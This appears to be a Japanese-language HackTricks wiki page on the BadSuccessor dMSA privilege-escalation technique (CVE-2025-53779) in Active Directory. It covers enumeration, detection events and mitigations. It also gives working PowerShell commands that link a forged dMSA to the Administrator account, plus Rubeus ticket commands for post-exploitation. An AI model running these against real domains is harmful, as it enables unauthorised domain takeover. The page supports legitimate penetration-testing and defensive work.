# BadSuccessor: Delegated MSA Migration Abuse による Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 概要

Delegated Managed Service Accounts（**dMSA**）は、Windows Server 2025 に搭載された **gMSA** の次世代後継です。正規の migration workflow では、管理者が *old* account（user、computer、または service account）を dMSA に置き換えつつ、権限を透過的に維持できます。この workflow は `Start-ADServiceAccountMigration` や `Complete-ADServiceAccountMigration` などの PowerShell cmdlet を通じて利用でき、**dMSA object** の 2 つの LDAP attribute に依存します。

* **`msDS-ManagedAccountPrecededByLink`** – 置き換えられた（old）account への *DN link*。
* **`msDS-DelegatedMSAState`**       – migration state（`0` = none、`1` = in-progress、`2` = *completed*）。<sup>[[1]](#references)</sup>

攻撃者が OU 内に **任意の** dMSA を作成し、これら 2 つの attribute を直接操作できる場合、LSASS と KDC はその dMSA を linked account の *successor* として扱います。その後、攻撃者が dMSA として authentication を行うと、**linked account のすべての privilege を継承します**。Administrator account が linked されている場合は、**Domain Admin** まで昇格できます。<sup>[[1]](#references)</sup>

この technique は、2025 年に Unit 42 により **BadSuccessor** と命名されました。その後 Microsoft は **CVE-2025-53779** を割り当て、2025 年 **8 月** に security update をリリースしました。この technique は、patch が適用されていない Windows Server 2025 環境、および危険な OU delegation の review において、引き続き relevant です。<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Attack prerequisites

1. **Organizational Unit (OU)** 内で object を作成することを *許可されており*、以下のいずれか 1 つ以上を持つ account:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`**（generic create）
2. LDAP および Kerberos への network connectivity（標準的な domain joined scenario / remote attack）。<sup>[[1]](#references)</sup>

## Vulnerable OUs の Enumerating

Unit 42 は、各 OU の security descriptor を parse し、必要な ACE を強調表示する PowerShell helper script をリリースしました。<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
内部では、このスクリプトは `(objectClass=organizationalUnit)` に対してページングされた LDAP search を実行し、すべての `nTSecurityDescriptor` について以下を確認します。

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8`（object class *msDS-DelegatedManagedServiceAccount*）

## Exploitation Steps

書き込み可能な OU が特定されると、攻撃はわずか 3 回の LDAP writes で実行できます。<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
レプリケーション後、攻撃者は単純に `attacker_dMSA$` として **logon** するか、Kerberos TGT を要求できます。Windows は *superseded* アカウントのトークンを構築します。<sup>[[1]](#references)</sup>

### 自動化

複数の公開 PoC が、password retrieval と ticket management を含むワークフロー全体をラップしています：

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Detection & Hunting

OU で **Object Auditing** を有効にし、以下の Windows Security Events を監視します:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – **dMSA** オブジェクトの作成
* **5136** – **`msDS-ManagedAccountPrecededByLink`** の変更
* **4662** – 特定の属性変更
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA に対する TGT 発行

`4662`（属性変更）、`4741`（コンピューター/サービスアカウントの作成）、`4624`（その後のログオン）を相関分析すると、BadSuccessor の活動を迅速に特定できます。**XSIAM** などの XDR solutions には、すぐに使用できるクエリが用意されています（references を参照）。<sup>[[2]](#references)</sup>

## Mitigation

* Microsoft の **CVE-2025-53779** security update を適用し、すべての Windows Server 2025 domain controller の patch level を確認します。<sup>[[6]](#references)</sup>
* **least privilege** の原則を適用し、*Service Account* の管理は信頼できる roles にのみ委任します。
* 明示的に必要としない OU から `Create Child` / `msDS-DelegatedManagedServiceAccount` を削除します。
* 上記の event IDs を監視し、*non-Tier-0* identities による dMSA の作成または編集を alert します。

## See also


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Active Directory での権限昇格を目的とした dMSA の悪用 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Good Accounts Go Bad: Delegated Managed Service Accounts の悪用](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor モジュール](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
